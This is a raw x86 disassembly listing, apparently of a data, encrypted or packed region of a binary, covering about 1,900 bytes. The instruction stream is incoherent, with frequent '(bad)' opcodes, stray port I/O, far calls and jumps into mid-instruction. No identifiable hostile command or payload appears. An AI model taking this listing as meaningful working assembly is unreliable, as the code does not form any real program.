  41df4c:	pop    ss
  41df4d:	loope  0x41df71
  41df4f:	mov    eax,0x76f10faf
  41df54:	mov    ebp,0x26f5d6f2
  41df59:	jg     0x41df4a
  41df5b:	cmp    eax,0xaf7c2d55
  41df60:	aam    0x20
  41df62:	pop    ecx
  41df63:	(bad)  
  41df64:	sbb    eax,0xe9b640f1
  41df69:	(bad)  
  41df6a:	les    ecx,FWORD PTR [ebx+0x6be764c4]
  41df70:	xchg   ecx,eax
  41df71:	cdq    
  41df72:	mov    eax,ds:0x77a7efd5
  41df77:	push   0xb032523e
  41df7c:	shl    DWORD PTR [edx],0x80
  41df7f:	or     edi,DWORD PTR [ebp-0x23]
  41df82:	push   es
  41df83:	dec    ecx
  41df84:	in     al,0x47
  41df86:	int3   
  41df87:	mov    ds:0x8d0d5c5a,eax
  41df8c:	sub    DWORD PTR [edx],0xffffffdb
  41df8f:	inc    BYTE PTR [ebp+0x167e296c]
  41df95:	int3   
  41df96:	sub    cl,bl
  41df98:	(bad)  
  41df99:	scas   al,BYTE PTR es:[edi]
  41df9a:	psadbw mm6,QWORD PTR [edx+0x72]
  41df9e:	pop    esp
  41df9f:	xchg   edx,eax
  41dfa0:	xor    ecx,DWORD PTR [ebx+0x1]
  41dfa3:	rcl    DWORD PTR [eax-0x737fc453],1
  41dfa9:	push   ecx
  41dfaa:	enter  0x2237,0xa9
  41dfae:	ss cs dec ebx
  41dfb1:	popa   
  41dfb2:	icebp  
  41dfb3:	sbb    eax,0x76af8163
  41dfb8:	std    
  41dfb9:	out    0xb5,al
  41dfbb:	add    al,0xd0
  41dfbd:	fcom   QWORD PTR [edi+0x3c]
  41dfc0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dfc1:	cmp    eax,0x536f665e
  41dfc6:	sub    dl,BYTE PTR [esi+eiz*4+0x71]
  41dfca:	sbb    DWORD PTR [edx+0x19],eax
  41dfcd:	jmp    0x41e039
  41dfcf:	fmul   DWORD PTR [ebp-0x335a04dd]
  41dfd5:	push   ebp
  41dfd6:	xlat   BYTE PTR ds:[ebx]
  41dfd7:	lock or BYTE PTR [ebp+0x4bea7e61],0x18
  41dfdf:	fcmovb st,st(1)
  41dfe1:	arpl   WORD PTR [ebx+0x63],ax
  41dfe4:	pop    ecx
  41dfe5:	jno    0x41df6e
  41dfe7:	out    dx,eax
  41dfe8:	jle    0x41e061
  41dfea:	mov    al,bh
  41dfec:	pop    eax
  41dfed:	mov    esi,0x914314b9
  41dff2:	mov    eax,ds:0x9154271b
  41dff7:	adc    BYTE PTR [esi+esi*2+0x36670cb5],dh
  41dffe:	jns    0x41dff2
  41e000:	push   cs
  41e001:	aad    0x1f
  41e003:	jge    0x41e07f
  41e005:	test   eax,eax
  41e007:	call   0xffb:0x565d3d0b
  41e00e:	aaa    
  41e00f:	test   al,0x74
  41e011:	dec    edi
  41e013:	xor    eax,DWORD PTR [edx-0x3]
  41e016:	or     al,0x98
  41e018:	scas   eax,DWORD PTR es:[edi]
  41e019:	and    DWORD PTR [edx-0x70],ebp
  41e01c:	and    esp,DWORD PTR ds:0xd608b3e9
  41e022:	xchg   ebx,eax
  41e023:	mov    ebp,0x8962df50
  41e028:	in     eax,0x3d
  41e02a:	outs   dx,BYTE PTR ds:[esi]
  41e02b:	das    
  41e02c:	ja     0x41e06a
  41e02e:	sub    bl,ch
  41e030:	dec    edx
  41e031:	in     eax,0x74
  41e033:	add    DWORD PTR [edx+0x7b],esi
  41e036:	push   0x6d
  41e038:	sub    DWORD PTR [esi+0x51],edx
  41e03b:	push   ecx
  41e03c:	enter  0xdd4d,0x8d
  41e040:	inc    eax
  41e041:	loope  0x41e076
  41e043:	gs push esp
  41e045:	push   cs
  41e046:	loope  0x41dff4
  41e048:	ret    
  41e049:	inc    eax
  41e04a:	stc    
  41e04b:	push   edi
  41e04c:	pop    edi
  41e04d:	into   
  41e04e:	xchg   esi,eax
  41e04f:	add    al,0x42
  41e051:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e052:	pushf  
  41e053:	ds xor eax,0x9c08c9ca
  41e059:	cli    
  41e05a:	retf   
  41e05b:	repz shl BYTE PTR [ebx+0x5d],1
  41e05f:	jb     0x41e016
  41e061:	fs gs dec edi
  41e064:	xor    dh,BYTE PTR [esi]
  41e066:	jb     0x41e0c0
  41e068:	mov    fs,WORD PTR [edx-0x496bb1b4]
  41e06e:	and    bl,0x50
  41e071:	inc    eax
  41e072:	arpl   WORD PTR [esi],si
  41e074:	mov    ds:0x7a05e5bd,eax
  41e079:	leave  
  41e07a:	inc    ecx
  41e07b:	xlat   BYTE PTR ds:[ebx]
  41e07c:	mov    ah,0x41
  41e07e:	int3   
  41e07f:	push   edi
  41e080:	test   al,0x33
  41e082:	or     BYTE PTR [ebx+eax*2-0x53],al
  41e086:	inc    edx
  41e087:	adc    eax,0x54e48500
  41e08c:	xchg   BYTE PTR [edi-0x1],dh
  41e08f:	iret   
  41e090:	in     al,dx
  41e091:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e092:	sbb    DWORD PTR [eax],0x6b03d754
  41e098:	mov    ds:0x26d39d44,al
  41e09d:	in     al,dx
  41e09e:	push   cs
  41e09f:	xlat   BYTE PTR ds:[ebx]
  41e0a0:	mov    bl,0xc8
  41e0a2:	mov    eax,ds:0x8e3a14b2
  41e0a7:	or     eax,0xb2932738
  41e0ac:	lods   al,BYTE PTR ds:[esi]
  41e0ad:	shr    BYTE PTR [ebx],0x81
  41e0b0:	sbb    DWORD PTR [ecx+0x3a],ecx
  41e0b3:	loopne 0x41e0e4
  41e0b5:	push   edx
  41e0b6:	ss dec esp
  41e0b8:	or     eax,0x8a8a2c43
  41e0bd:	pop    edx
  41e0be:	out    dx,eax
  41e0bf:	jl     0x41e125
  41e0c1:	es mov ds,ecx
  41e0c4:	bound  ebx,QWORD PTR [esi]
  41e0c6:	icebp  
  41e0c7:	jmp    0x41e04c
  41e0c9:	sahf   
  41e0ca:	xor    al,0x70
  41e0cc:	lea    eax,[edi-0x7ea70d91]
  41e0d2:	rcr    cl,1
  41e0d4:	xchg   edi,eax
  41e0d5:	xchg   esi,eax
  41e0d6:	mov    ds:0xa406b288,al
  41e0db:	pop    ebx
  41e0dc:	loop   0x41e13d
  41e0de:	push   edx
  41e0df:	inc    eax
  41e0e0:	(bad)  
  41e0e1:	push   ecx
  41e0e2:	pusha  
  41e0e3:	adc    ah,0x53
  41e0e6:	and    al,BYTE PTR [esp+0x3e680497]
  41e0ed:	repz shr BYTE PTR [edx-0x6f],0x6f
  41e0f2:	xchg   edi,eax
  41e0f3:	(bad)  
  41e0f4:	fdivr  DWORD PTR fs:[ebp+0x6f]
  41e0f8:	xor    esi,eax
  41e0fa:	das    
  41e0fb:	xchg   esi,eax
  41e0fc:	test   eax,0xabdfc5fb
  41e101:	pop    ecx
  41e102:	ins    DWORD PTR es:[edi],dx
  41e103:	in     eax,dx
  41e104:	jecxz  0x41e17f
  41e106:	test   BYTE PTR [ebx],ch
  41e108:	arpl   WORD PTR [ecx-0x4e],ax
  41e10b:	scas   al,BYTE PTR es:[edi]
  41e10c:	add    eax,0x8b259351
  41e111:	sbb    ch,BYTE PTR [ebp-0x5e4cf9e1]
  41e117:	adc    edi,DWORD PTR [ecx]
  41e119:	mov    esi,esi
  41e11b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e11c:	ror    BYTE PTR ss:[ebx-0x4e],0xfd
  41e121:	out    dx,eax
  41e122:	mov    al,0xe8
  41e124:	mov    al,ds:0xa0cae94b
  41e129:	mov    edx,0x372e9073
  41e12e:	sbb    ch,0x96
  41e131:	scas   al,BYTE PTR es:[edi]
  41e132:	sub    DWORD PTR [esi-0x18],edi
  41e135:	push   eax
  41e136:	(bad)  
  41e137:	or     eax,0xfa351db5
  41e13c:	fdiv   st(7),st
  41e13e:	imul   edi,eax,0xb
  41e141:	mov    al,ds:0x40e8a355
  41e146:	mov    WORD PTR [eax],ds
  41e148:	mov    edi,0xb747c563
  41e14d:	sub    edx,edx
  41e14f:	and    ebp,esi
  41e151:	rcl    BYTE PTR [edi-0x1a1a8554],1
  41e157:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e158:	stc    
  41e159:	(bad)  
  41e15a:	push   eax
  41e15b:	pop    ss
  41e15c:	je     0x41e1cc
  41e15e:	gs out 0xa1,al
  41e161:	popa   
  41e162:	jg     0x41e1d2
  41e164:	pushf  
  41e165:	ja     0x41e1d7
  41e167:	mov    bl,0x95
  41e169:	lds    eax,FWORD PTR [edi+edx*1-0x7e7dd0b4]
  41e170:	retf   
  41e171:	sub    eax,DWORD PTR ds:0x79080677
  41e177:	cdq    
  41e178:	push   ss
  41e179:	imul   ax,dx,0x23
  41e17d:	lock sub eax,0xab851929
  41e183:	or     al,0x3a
  41e185:	aam    0x5c
  41e187:	jb     0x41e180
  41e189:	mov    dl,0xbf
  41e18b:	xchg   esp,eax
  41e18c:	outs   dx,DWORD PTR ds:[esi]
  41e18d:	bound  edx,QWORD PTR [edx+0x36]
  41e190:	pop    edi
  41e191:	pop    edi
  41e192:	jo     0x41e1c9
  41e194:	mov    bl,0xa2
  41e196:	cmovp  eax,DWORD PTR [edx]
  41e199:	pop    edi
  41e19a:	mov    esi,0xde3f23f2
  41e19f:	push   cs
  41e1a0:	test   eax,0x91bc0e24
  41e1a5:	in     al,0x53
  41e1a7:	scas   eax,DWORD PTR es:[edi]
  41e1a8:	leave  
  41e1a9:	sub    BYTE PTR [esi-0x3adcd0c2],dh
  41e1af:	add    BYTE PTR [edi+0x15],bl
  41e1b2:	pop    edi
  41e1b3:	inc    esi
  41e1b4:	aam    0xd4
  41e1b6:	mov    ebx,0x3b339292
  41e1bb:	mov    esi,0x40b6d0cf
  41e1c0:	and    eax,0xd2e859e0
  41e1c5:	aam    0x7
  41e1c7:	push   ebx
  41e1c8:	test   BYTE PTR [ecx+0x40076323],cl
  41e1ce:	pusha  
  41e1cf:	pop    esp
  41e1d0:	mov    bl,0xfe
  41e1d2:	add    DWORD PTR [ecx+0x763f6513],edi
  41e1d8:	arpl   WORD PTR [ecx-0xa],di
  41e1db:	add    dh,BYTE PTR [esi*1-0x1a7775d1]
  41e1e2:	add    al,0x3e
  41e1e4:	mov    eax,0xa48dfee8
  41e1e9:	push   es
  41e1ea:	mov    DWORD PTR [ecx],edi
  41e1ec:	imul   edx,DWORD PTR [ecx+0x57],0x8a4a2ffc
  41e1f3:	cmp    ch,BYTE PTR [ecx]
  41e1f5:	mov    edx,0xe7315f5a
  41e1fa:	mov    bh,0x40
  41e1fc:	inc    edx
  41e1fd:	sar    BYTE PTR [eax+0x581704c8],0x48
  41e204:	sub    ebx,ebp
  41e206:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  41e208:	mov    ch,0xf9
  41e20a:	(bad)  
  41e20b:	jnp    0x41e25a
  41e20d:	sbb    eax,0x9d06fad5
  41e212:	in     eax,dx
  41e213:	jnp    0x41e24e
  41e215:	shr    eax,cl
  41e217:	cwde   
  41e218:	push   cs
  41e219:	loopne 0x41e27c
  41e21b:	imul   esp,DWORD PTR [ebx-0x6a],0xfffffffb
  41e21f:	cmp    ebp,esp
  41e221:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e222:	sub    al,0x2e
  41e224:	push   ecx
  41e225:	push   ecx
  41e226:	inc    ecx
  41e227:	cwde   
  41e228:	push   ss
  41e229:	or     eax,0x719e116c
  41e22e:	mov    eax,ds:0xae8a822c
  41e233:	dec    esi
  41e234:	jne    0x41e23a
  41e236:	loopne 0x41e1c8
  41e238:	in     eax,dx
  41e239:	inc    eax
  41e23a:	mov    ebx,0x97b885b8
  41e23f:	mov    eax,0x667c1a13
  41e244:	sbb    DWORD PTR [ecx+ebp*4],ebp
  41e247:	xor    BYTE PTR [esi],ah
  41e249:	rol    BYTE PTR [ecx-0x579f3153],cl
  41e24f:	sub    eax,0x4974e987
  41e254:	sub    al,0x6f
  41e256:	test   al,0x17
  41e258:	out    dx,al
  41e259:	std    
  41e25a:	mov    DWORD PTR [ebp-0x2c447e8],esp
  41e260:	imul   ebx,eax,0x2d2f0af
  41e266:	nop
  41e267:	cs push ebp
  41e269:	inc    esp
  41e26a:	adc    DWORD PTR [edx],ebx
  41e26c:	retf   0xcbd3
  41e26f:	cmp    eax,0x7be4fb2d
  41e274:	mov    ah,0xe2
  41e276:	pop    ecx
  41e277:	in     al,dx
  41e278:	pop    es
  41e279:	aas    
  41e27a:	(bad)  
  41e27b:	mov    esp,0xa6deaf52
  41e280:	aas    
  41e281:	jge    0x41e228
  41e283:	push   ebx
  41e284:	ror    esi,1
  41e286:	jge    0x41e226
  41e288:	or     BYTE PTR [ecx+esi*8],bl
  41e28b:	cwde   
  41e28c:	jp     0x41e285
  41e28e:	lods   al,BYTE PTR ds:[esi]
  41e28f:	mov    ebp,DWORD PTR [edi+0x27]
  41e292:	push   es
  41e293:	test   DWORD PTR [eax-0xa10beea],esi
  41e299:	bnd ret 0x136d
  41e29d:	sar    BYTE PTR [esp+ebx*4],0xd2
  41e2a1:	ss and ebx,esi
  41e2a4:	jge    0x41e2cd
  41e2a6:	call   0xba3eb110
  41e2ab:	test   BYTE PTR [esi-0x28989bb6],ah
  41e2b1:	jb     0x41e252
  41e2b3:	inc    edx
  41e2b4:	mov    ebp,0xc87a4a54
  41e2b9:	fmul   QWORD PTR ds:0x62e374c9
  41e2bf:	pusha  
  41e2c0:	sub    ch,al
  41e2c2:	cmp    edi,DWORD PTR [ebp-0x3530692d]
  41e2c8:	popa   
  41e2c9:	xor    esi,DWORD PTR [esi+0x15e26005]
  41e2cf:	ja     0x41e28f
  41e2d1:	sbb    esi,DWORD PTR [eax+0x76]
  41e2d4:	ja     0x41e276
  41e2d6:	pop    eax
  41e2d7:	fxtract 
  41e2d9:	mov    ds:0x271b1dee,al
  41e2de:	sub    BYTE PTR [ecx],cl
  41e2e0:	daa    
  41e2e1:	cmp    edx,ecx
  41e2e3:	jp     0x41e338
  41e2e5:	xlat   BYTE PTR ds:[ebx]
  41e2e6:	outs   dx,BYTE PTR ds:[esi]
  41e2e7:	and    esp,DWORD PTR [ecx+eax*1-0x2eb80c6c]
  41e2ee:	mov    DWORD PTR [ebx-0x5b0be61a],ebx
  41e2f4:	push   eax
  41e2f5:	xchg   edi,eax
  41e2f6:	dec    eax
  41e2f7:	inc    esp
  41e2f8:	arpl   WORD PTR [eax+0x799299fa],bp
  41e2fe:	pusha  
  41e2ff:	mov    BYTE PTR [edx+0x1a],ah
  41e302:	sbb    ebx,DWORD PTR [edx]
  41e304:	pop    esp
  41e305:	cli    
  41e306:	xchg   eax,esi
  41e308:	push   es
  41e309:	(bad)  
  41e30a:	push   ecx
  41e30b:	ret    
  41e30c:	shl    BYTE PTR [ebx-0x27],cl
  41e30f:	push   es
  41e310:	sub    al,0x10
  41e312:	call   0xd67c:0x311035ca
  41e319:	sub    al,0xe1
  41e31b:	jle    0x41e2e9
  41e31d:	es push ecx
  41e31f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e320:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e321:	xchg   ebx,eax
  41e322:	sub    eax,0x9dec9c29
  41e327:	dec    edx
  41e328:	mov    DWORD PTR [eax+0x3eb393cb],esp
  41e32e:	cli    
  41e32f:	push   0xffffffc5
  41e331:	dec    edx
  41e332:	cs xchg edx,eax
  41e334:	inc    ebx
  41e335:	in     al,dx
  41e336:	pop    edx
  41e337:	out    dx,al
  41e338:	xchg   ecx,eax
  41e339:	aam    0xe
  41e33b:	in     al,0x2f
  41e33d:	retf   0x20b7
  41e340:	shl    BYTE PTR [ecx-0x4cf6955c],1
  41e346:	add    DWORD PTR [eax],edi
  41e348:	jp     0x41e2cc
  41e34a:	fwait
  41e34b:	icebp  
  41e34c:	mov    cs,WORD PTR [ebp+0x7d0bf532]
  41e352:	mov    esi,0x1ea23406
  41e357:	test   ch,ah
  41e359:	mov    al,0x39
  41e35b:	outs   dx,DWORD PTR ds:[esi]
  41e35c:	pusha  
  41e35d:	sub    eax,0x5ac9879d
  41e362:	push   edi
  41e363:	dec    edx
  41e364:	push   ss
  41e365:	xchg   ebx,eax
  41e366:	repz xor eax,DWORD PTR [esi+0x3a]
  41e36a:	jnp    0x41e300
  41e36c:	loop   0x41e3a8
  41e36e:	out    0x43,al
  41e370:	aas    
  41e371:	xchg   edi,eax
  41e372:	sbb    cl,BYTE PTR [ecx-0xf86e271]
  41e378:	xchg   ebx,eax
  41e379:	(bad)  
  41e37a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e37b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e37c:	in     al,0xf5
  41e37e:	es popf 
  41e380:	pop    edx
  41e381:	gs push ebx
  41e383:	ret    0xac57
  41e386:	retf   
  41e387:	aam    0x5a
  41e389:	(bad)  
  41e38a:	cwde   
  41e38b:	ds jb  0x41e364
  41e38e:	xchg   esp,eax
  41e38f:	mov    dh,0x3c
  41e391:	fisttp WORD PTR [eax-0x7]
  41e394:	ficom  DWORD PTR [esi+0x53252ec6]
  41e39a:	sub    al,0x25
  41e39c:	imul   ebp,DWORD PTR es:[ebp+0x60ce77e1],0xdf6a8ce2
  41e3a7:	mov    ecx,db6
  41e3aa:	mov    DWORD PTR [eax-0xb],ecx
  41e3ad:	mov    bh,0xf1
  41e3af:	scas   eax,DWORD PTR es:[edi]
  41e3b0:	pop    ebp
  41e3b1:	sbb    BYTE PTR [ebp+0x42],cl
  41e3b4:	sbb    BYTE PTR [ecx],bh
  41e3b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e3b7:	push   0xffffffc0
  41e3b9:	adc    dh,0x57
  41e3bc:	mov    edi,0x5265dbce
  41e3c1:	inc    esp
  41e3c2:	xchg   ebp,eax
  41e3c3:	xor    al,0xda
  41e3c5:	push   ebp
  41e3c6:	ror    cl,1
  41e3c8:	fwait
  41e3c9:	icebp  
  41e3ca:	or     dh,bl
  41e3cc:	mov    al,ds:0xb509ba6c
  41e3d1:	adc    BYTE PTR [edi],ch
  41e3d3:	into   
  41e3d4:	mov    ecx,0xfdbed642
  41e3d9:	pop    ebp
  41e3da:	and    eax,0xe48ecb5d
  41e3df:	mov    ds:0x5d619dab,al
  41e3e4:	mov    BYTE PTR [edi+0x60d34e4a],cl
  41e3ea:	popa   
  41e3eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e3ec:	aam    0xef
  41e3ee:	repnz push ebx
  41e3f0:	jmp    0x41e386
  41e3f2:	mov    al,0x15
  41e3f4:	gs in  al,0x50
  41e3f7:	aas    
  41e3f8:	arpl   WORD PTR ds:[ebp-0x38695ad4],dx
  41e3ff:	xor    DWORD PTR ds:[ebx],edx
  41e402:	shl    BYTE PTR [ebp+ebp*1+0xb51ac42],cl
  41e409:	mov    dl,0xa0
  41e40b:	mul    BYTE PTR [edx-0x6c737972]
  41e411:	es push ss
  41e413:	stos   BYTE PTR es:[edi],al
  41e414:	or     edx,eax
  41e416:	inc    ecx
  41e417:	(bad)  
  41e418:	sbb    al,0xad
  41e41a:	aas    
  41e41b:	mov    bh,0xbc
  41e41d:	int    0xe4
  41e41f:	cli    
  41e420:	cmp    al,0xb6
  41e422:	xchg   edi,eax
  41e423:	inc    eax
  41e424:	or     BYTE PTR [esi-0x1a0c0710],al
  41e42a:	push   esp
  41e42b:	fild   WORD PTR [edi-0x53]
  41e42e:	mov    eax,0xfa89f34b
  41e433:	pop    edi
  41e434:	jmp    0xfbc9681b
  41e439:	jnp    0x41e466
  41e43b:	seta   BYTE PTR [edi+esi*4]
  41e43f:	mov    dh,BYTE PTR [esi-0x19]
  41e442:	sbb    eax,0x5be35f6b
  41e447:	leave  
  41e448:	cmp    ch,BYTE PTR [eax+0x7a]
  41e44b:	mov    ds:0x70078fc5,al
  41e450:	adc    al,0x30
  41e452:	ss ret 
  41e454:	and    eax,0x45337709
  41e459:	adc    DWORD PTR [edx+0x7b3b442f],esp
  41e45f:	jle    0x41e451
  41e461:	inc    ecx
  41e462:	sbb    ebx,DWORD PTR [edi]
  41e464:	mov    esp,0x6cfa186
  41e469:	dec    edx
  41e46a:	aam    0xe6
  41e46c:	push   ss
  41e46d:	fisttp WORD PTR [edx+0x74]
  41e470:	mov    eax,0xbe75ebb3
  41e475:	inc    ecx
  41e476:	bound  edi,QWORD PTR [ecx]
  41e478:	xchg   esi,eax
  41e479:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e47a:	mov    ds:0x2f215107,eax
  41e47f:	jecxz  0x41e482
  41e481:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e482:	ins    BYTE PTR es:[edi],dx
  41e483:	inc    ebp
  41e484:	jmp    0xac49:0xa9c34c3a
  41e48b:	and    al,0x90
  41e48d:	ret    
  41e48e:	dec    edx
  41e48f:	sti    
  41e490:	inc    eax
  41e491:	add    eax,0x5cb4dce7
  41e496:	fcmovb st,st(4)
  41e498:	mov    al,0xcc
  41e49a:	push   eax
  41e49b:	mov    ah,0x9a
  41e49d:	dec    ecx
  41e49e:	xchg   ebp,eax
  41e49f:	fst    DWORD PTR [esi]
  41e4a1:	fsubr  QWORD PTR [ebp+edx*8+0x14760348]
  41e4a8:	mov    bl,0xc0
  41e4aa:	repz cdq 
  41e4ac:	std    
  41e4ad:	push   esp
  41e4ae:	cmp    DWORD PTR [edx],0xfffffff5
  41e4b1:	push   cs
  41e4b2:	cmp    al,BYTE PTR [eax+edi*2-0x21b16200]
  41e4b9:	mov    edx,0x43e44f55
  41e4be:	mov    ecx,0x2985ce9c
  41e4c3:	xchg   ecx,eax
  41e4c4:	xor    ebx,DWORD PTR [ecx+0x65]
  41e4c7:	je     0x41e4c3
  41e4c9:	push   ds
  41e4ca:	cld    
  41e4cb:	xchg   edx,eax
  41e4cc:	cli    
  41e4cd:	mov    esp,0x430cd744
  41e4d2:	inc    ecx
  41e4d3:	and    eax,0x1bba47e6
  41e4d8:	jne    0x41e4a2
  41e4da:	xor    DWORD PTR [ecx],ebp
  41e4dc:	xchg   ebx,eax
  41e4dd:	or     eax,0x18b92ba4
  41e4e2:	daa    
  41e4e3:	js     0x41e490
  41e4e5:	je     0x41e473
  41e4e7:	xor    bh,BYTE PTR [eax]
  41e4e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e4ea:	sahf   
  41e4eb:	mov    al,0xee
  41e4ed:	out    dx,eax
  41e4ee:	adc    DWORD PTR [edx-0x63],eax
  41e4f1:	fs pop ebp
  41e4f3:	shr    BYTE PTR [ecx],0xc9
  41e4f6:	xor    al,0x0
  41e4f8:	mov    WORD PTR ds:0x988b7e35,cs
  41e4fe:	stos   BYTE PTR es:[edi],al
  41e4ff:	jno    0x41e4bc
  41e501:	mov    esp,0x43d0c0e0
  41e506:	xchg   ebp,eax
  41e507:	add    ah,BYTE PTR [ecx+esi*1]
  41e50a:	sub    eax,0xc19aec10
  41e50f:	ss add eax,0x3ca195d6
  41e515:	es jmp 0xef3222c8
  41e51b:	xor    DWORD PTR ds:0xef402f42,esi
  41e521:	push   0x6c383391
  41e526:	pop    ss
  41e527:	jno    0x41e4cd
  41e529:	sub    DWORD PTR [esp+eiz*4-0x53ca2c1a],0x1ef6024c
  41e534:	jne    0x41e572
  41e536:	out    dx,eax
  41e537:	push   0x3e
  41e539:	(bad)  ds:0x2b8d42ea
  41e53f:	dec    esi
  41e540:	das    
  41e541:	sub    BYTE PTR [ecx+0x45],al
  41e544:	mov    ecx,0x47720900
  41e549:	ret    
  41e54a:	pop    esp
  41e54b:	inc    edx
  41e54c:	pop    edx
  41e54d:	sub    dh,BYTE PTR [eax-0x10]
  41e550:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e551:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e552:	dec    edx
  41e553:	cmp    eax,0x12a0277
  41e558:	jns    0x41e513
  41e55a:	daa    
  41e55b:	aad    0xed
  41e55d:	mov    cl,BYTE PTR [esi]
  41e55f:	popa   
  41e560:	aaa    
  41e561:	in     al,0xdd
  41e563:	add    al,0x81
  41e565:	pop    ebp
  41e566:	fld1   
  41e568:	adc    DWORD PTR [edi+edx*8],ebx
  41e56b:	ror    DWORD PTR [eax],0x38
  41e56e:	out    0x9a,eax
  41e570:	popf   
  41e571:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e572:	shl    DWORD PTR [ecx+0x7e],1
  41e575:	nop
  41e576:	push   eax
  41e577:	call   0x8461cfc8
  41e57c:	pop    es
  41e57d:	push   cs
  41e57e:	mov    cl,BYTE PTR ds:[edx]
  41e581:	cmp    BYTE PTR [ebx],ah
  41e583:	es dec edx
  41e585:	cwde   
  41e586:	mov    bh,al
  41e588:	pop    esp
  41e589:	gs mov esi,0x1d1e9624
  41e58f:	mov    BYTE PTR [edx-0x50],bl
  41e592:	mov    al,ds:0xc27d6ef4
  41e597:	dec    esi
  41e598:	pop    ss
  41e599:	ins    DWORD PTR es:[edi],dx
  41e59a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e59b:	repnz (bad) 
  41e59d:	jmp    0x41e59e
  41e59f:	stos   DWORD PTR es:[edi],eax
  41e5a0:	sbb    eax,0xbede5b35
  41e5a5:	stos   DWORD PTR es:[edi],eax
  41e5a6:	shl    DWORD PTR [edi],1
  41e5a8:	inc    esp
  41e5a9:	push   ebx
  41e5aa:	push   ebp
  41e5ab:	aad    0xd3
  41e5ad:	xor    al,0x61
  41e5af:	mov    ebp,DWORD PTR [edx-0x5936b43e]
  41e5b5:	fsubr  DWORD PTR [esi+0x6b8b43de]
  41e5bb:	daa    
  41e5bc:	in     eax,dx
  41e5bd:	inc    edx
  41e5be:	xchg   edi,eax
  41e5bf:	mov    edi,0x7908b064
  41e5c4:	mov    esp,0x75c2c50
  41e5c9:	out    0xa8,al
  41e5cb:	std    
  41e5cc:	outs   dx,BYTE PTR ds:[esi]
  41e5cd:	aam    0x9e
  41e5cf:	jle    0x41e599
  41e5d1:	push   0x2f
  41e5d3:	add    ecx,DWORD PTR [edi]
  41e5d5:	and    DWORD PTR [eax],ebx
  41e5d7:	fwait
  41e5d8:	xlat   BYTE PTR ds:[ebx]
  41e5d9:	mov    WORD PTR [edi+0x62],es
  41e5dc:	xor    DWORD PTR [esi-0x6a],0xff460d1f
  41e5e3:	push   edx
  41e5e4:	mov    ebp,DWORD PTR [ecx-0x4d]
  41e5e7:	scas   al,BYTE PTR es:[edi]
  41e5e8:	loopne 0x41e5f9
  41e5ea:	icebp  
  41e5eb:	or     al,0x74
  41e5ed:	(bad)  
  41e5ef:	call   0xa0da:0x63d683e3
  41e5f6:	sbb    BYTE PTR [ebx+0x7587426b],0xcc
  41e5fd:	repnz cmp ebx,esp
  41e600:	scas   eax,DWORD PTR es:[edi]
  41e601:	daa    
  41e602:	jp     0x41e5f0
  41e604:	clc    
  41e605:	mov    ah,0xb8
  41e607:	sar    BYTE PTR [edx*8+0x3840dca8],0x8a
  41e60f:	mov    ss,WORD PTR [ebp-0x777812]
  41e615:	mov    cl,0xe2
  41e617:	(bad)  
  41e618:	jmp    0x41e672
  41e61a:	iret   
  41e61b:	sbb    ebp,DWORD PTR [esp+esi*2+0x6b]
  41e61f:	and    DWORD PTR [esi],edi
  41e621:	int    0x0
  41e623:	jnp    0x41e5a5
  41e625:	aam    0x5f
  41e627:	fadd   st,st(1)
  41e629:	test   al,0xb5
  41e62b:	test   DWORD PTR [esi+eax*8-0x3673440c],ecx
  41e632:	retf   
  41e633:	push   eax
  41e634:	push   ds
  41e635:	ins    BYTE PTR es:[edi],dx
  41e636:	mov    ch,0xff
  41e638:	or     esi,DWORD PTR [edi]
  41e63a:	push   edx
  41e63b:	and    al,0x69
  41e63d:	sub    edx,DWORD PTR [esi+0x17]
  41e640:	fistp  DWORD PTR [eax-0x4b]
  41e643:	js     0x41e5ed
  41e645:	adc    DWORD PTR [ecx-0x62],edi
  41e648:	and    eax,0x97036e47
  41e64d:	sbb    al,0x2c
  41e64f:	mov    cl,0x11
  41e651:	push   edx
  41e652:	push   ss
  41e653:	stos   BYTE PTR es:[edi],al
  41e654:	push   0x2b
  41e656:	jo     0x41e6bf
  41e658:	lods   eax,DWORD PTR ds:[esi]
  41e659:	into   
  41e65a:	inc    esp
  41e65b:	rol    bh,cl
  41e65d:	or     BYTE PTR [eax-0x10],bh
  41e660:	pop    ecx
  41e661:	or     eax,0x14f658b2
  41e666:	rcr    DWORD PTR [edx-0x2007fdd3],1
  41e66c:	dec    eax
  41e66d:	push   eax
  41e66e:	cwde   
  41e66f:	pop    esp
  41e670:	rol    DWORD PTR [ebx+0x3efadc94],0xe3
  41e677:	mov    ds:0x2e7a499f,eax
  41e67c:	sub    DWORD PTR [ebp+0x25],ebx
  41e67f:	xor    BYTE PTR [esi-0x257987cc],0x89
  41e686:	pop    ebx
  41e687:	dec    ebx
  41e688:	mov    edx,0x38e58ce0
  41e68d:	mov    ds:0x772d226f,al
  41e692:	jl     0x41e6e5
  41e694:	jo     0x41e628
  41e696:	cmp    DWORD PTR [eax+0x63],ebp
  41e699:	mov    eax,ss:0x3d31e71a
  41e69f:	cmc    
  41e6a0:	mov    bh,0x2c
  41e6a2:	mov    ecx,0xaf2d2d78
  41e6a7:	xor    eax,0x61843e7c
  41e6ac:	fidiv  DWORD PTR [eax-0x2a]
  41e6af:	jecxz  0x41e636
  41e6b1:	dec    esi
  41e6b2:	mov    DWORD PTR [edx+0x15],edx
  41e6b5:	ds inc esp
  41e6b7:	xchg   esp,eax
